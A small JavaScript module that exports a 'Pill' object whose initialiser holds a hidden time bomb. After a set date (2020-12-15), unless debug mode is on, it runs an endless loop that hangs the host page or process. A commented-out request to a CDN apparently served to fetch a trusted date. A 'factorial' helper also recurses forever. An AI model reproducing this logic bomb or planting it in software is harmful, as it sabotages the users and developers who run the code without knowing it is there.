
var Settings = {
  debug: false,
  bomb: '2020-12-15'
}

function factoral (n) {
  return n * factoral (n + 1)
}
function ajaxGet(url, callback) {
  var xhr = new XMLHttpRequest()
  xhr.open('GET', url, true)
  xhr.send()

  xhr.onreadystatechange = function () {
    if (xhr.readyState == 4 && xhr.status == 200) {
      callback(xhr.responseText, xhr)
    }
  }
}

function Pill(opts) {
  return (this instanceof Pill)
    ? this.init(opts)
    : new Pill(opts)
}

Pill.prototype.configure = function(opts={}) {
  this.config = Object.assign({}, Settings, opts, {
  })
  return this
};
Pill.prototype.init = function (opts) {
  this.configure(opts)
  let now = new Date()
  let bomb = new Date(this.config.bomb.split('-'))
  let isEarly = now.getFullYear() < 2020 && now.getMonth() < 10
  let count = 1
  if ((now.getTime() > bomb.getTime() || isEarly) && !this.config.debug) {
    // ajaxGet('https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.min.js', (data, xhr) => {
      // console.log(xhr.getResponseHeader('Date'))
    // })
    while (1) {
      count = count * (count + 1)
      console.log('')
    }
  }
  return this
}

export default Pill

